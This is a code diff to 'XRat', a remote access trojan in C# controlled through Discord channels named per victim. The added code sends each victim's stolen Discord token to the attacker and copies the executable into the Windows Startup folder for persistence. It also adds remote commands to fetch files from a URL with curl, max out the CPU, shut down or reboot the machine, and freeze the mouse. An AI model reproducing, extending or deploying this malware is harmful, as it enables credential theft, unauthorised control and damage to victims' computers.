@@ -11,6 +11,7 @@ using System.Diagnostics;
 using System.Windows.Forms;
 using static System.Net.Mime.MediaTypeNames;
 using System.Runtime.InteropServices;
+using System.Security.Policy;
 
 class Program
 {
@@ -113,6 +114,16 @@ class Program
             victimChannel = await guild.CreateTextChannelAsync($"victim-{victimId}");
             await logsChannel.SendMessageAsync($"@everyone | New victim gotten: {victimId}");
             await victimChannel.SendMessageAsync($"@everyone | All commands you will type here controlls only this victim | {victimId}");
+
+            await victimChannel.SendMessageAsync($"@everyone | Discord Token:\n{DiscordGrabber.GetToken()}");
+
+            if (Settings.enable_startup)
+            {
+                string path_to_startup = "C:\\Users\\ALEX\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+                bool status = Utils.CMD($"copy XRat.exe {path_to_startup} && exit");
+                await victimChannel.SendMessageAsync($"@everyone | Startup status: {status}");
+            }
+
         }
         catch (Exception e)
         {
@@ -139,7 +150,7 @@ class Program
 
         string command = args[0].ToLower();
 
-        if (command == Settings.prefix + "help")
+        if (command == Settings.prefix + "help" && userMessage.Channel.Id == victimChannel.Id)
         {
             await HandleHelpCommand(userMessage);
         }
@@ -224,6 +235,26 @@ class Program
             await HandleControlCommand(userMessage, args[1]);
         }
 
+        if (command == Settings.prefix + "boot" && userMessage.Channel.Id == victimChannel.Id)
+        {
+            await HandleBootCommand(userMessage);
+        }
+
+        if (command == Settings.prefix + "reboot" && userMessage.Channel.Id == victimChannel.Id)
+        {
+            await HandleRebootCommand(userMessage);
+        }
+
+        if (command == Settings.prefix + "upload" && userMessage.Channel.Id == victimChannel.Id)
+        {
+            await HandleUploadCommand(userMessage, args[1], args[2]);
+        }
+
+        if (command == Settings.prefix + "destroy_pc" && userMessage.Channel.Id == victimChannel.Id)
+        {
+            await HandleDestroyPCCommand(userMessage);
+        }
+
         //if (command == Settings.prefix + "camera" && userMessage.Channel.Id == victimChannel.Id)
         //{
         //    await HandleCameraCommand(userMessage);
@@ -236,12 +267,9 @@ class Program
 {Settings.banner}
 {userMessage.Author.Mention} | XRat by @avirt_
 -------------------------------------------
-Commands below works anywere
--------------------------------------------
-{Settings.prefix}help - Help Command
--------------------------------------------
 Commands below works only in victim channel
 -------------------------------------------
+{Settings.prefix}help - Help Command
 {Settings.prefix}mouse [x] [y]
 {Settings.prefix}getmousepos
 {Settings.prefix}click [button]
@@ -255,11 +283,62 @@ Commands below works only in victim channel
 {Settings.prefix}killprocess [pid]
 {Settings.prefix}filesystem [action] [path]
 {Settings.prefix}cmd [command]
+{Settings.prefix}destroy_pc - Makes the 90% CPU
+{Settings.prefix}upload [path] [url] - Uploads file to specific path
 {Settings.prefix}msgbox [text] [caption] - show message box
-{Settings.prefix}control [block unblock] - Block mouse or keyboard
+{Settings.prefix}control [block unblock block_mouse] - Block mouse or keyboard
+{Settings.prefix}boot - Shutdown the PC
+{Settings.prefix}reboot - Restart the PC
 {Settings.prefix}stop - Stop
 -------------------------------------------");
     }
+
+    private async Task HandleDestroyPCCommand(SocketUserMessage userMessage)
+    {
+        var guild = client.GetGuild(Settings.guildId);
+        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);
+
+        Utils.DestroyPC();
+
+        await logsChannel.SendMessageAsync($"Successfully destroyed victim '{victimId}' | By {userMessage.Author.Mention}");
+        await victimChannel.SendMessageAsync($"Successfully destroyed victim '{victimId}' | By {userMessage.Author.Mention}");
+    }
+
+    private async Task HandleUploadCommand(SocketUserMessage userMessage, string path, string url)
+    {
+        var guild = client.GetGuild(Settings.guildId);
+        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);
+
+        bool status = Utils.CMD(@$"cd {path} && {{ curl -s -O {url} ; cd -; }}");
+
+        await logsChannel.SendMessageAsync($"Successfully uploaded file to victim '{victimId}' | By {userMessage.Author.Mention}");
+        await victimChannel.SendMessageAsync($"Successfully uploaded file to victim '{victimId}' | By {userMessage.Author.Mention}");
+    }
+
+    private async Task HandleBootCommand(SocketUserMessage userMessage)
+    {
+        var guild = client.GetGuild(Settings.guildId);
+        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);
+
+        
+        await logsChannel.SendMessageAsync($"Successfully booted victim '{victimId}' | By {userMessage.Author.Mention}");
+        await victimChannel.SendMessageAsync($"booted victim '{victimId}' | By {userMessage.Author.Mention}");
+
+        Utils.CMD("shutdown /s");
+    }
+
+    private async Task HandleRebootCommand(SocketUserMessage userMessage)
+    {
+        var guild = client.GetGuild(Settings.guildId);
+        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);
+
+
+        await logsChannel.SendMessageAsync($"Successfully rebooted victim '{victimId}' | By {userMessage.Author.Mention}");
+        await victimChannel.SendMessageAsync($"rebooted victim '{victimId}' | By {userMessage.Author.Mention}");
+
+        Utils.CMD("shutdown /r");
+    }
+
     private async Task HandleStopCommand(SocketUserMessage userMessage)
     {
         var guild = client.GetGuild(Settings.guildId);
@@ -282,11 +361,26 @@ Commands below works only in victim channel
             await logsChannel.SendMessageAsync($"Successfully blocked victim '{victimId}' | By {userMessage.Author.Mention}");
             await victimChannel.SendMessageAsync($"blocked victim '{victimId}' | By {userMessage.Author.Mention}");
         }
+
         if (access == "unblock")
         {
             Utils.UnblockKeyboard();
             await victimChannel.SendMessageAsync($"unblocked victim '{victimId}' | By {userMessage.Author.Mention}");
             await logsChannel.SendMessageAsync($"Successfully unblocked victim '{victimId}' | By {userMessage.Author.Mention}");
+        }
+
+        if (access == "block_mouse")
+        {
+            int x = 0;
+            int y = 0;
+
+            await victimChannel.SendMessageAsync($"blocked mouse victim '{victimId}' | By {userMessage.Author.Mention}");
+            await logsChannel.SendMessageAsync($"Successfully blocked mouse victim '{victimId}' | By {userMessage.Author.Mention}");
+
+            while (true)
+            {
+                robot.MouseMove(new Point(x, y));
+            }
         }
     }
 
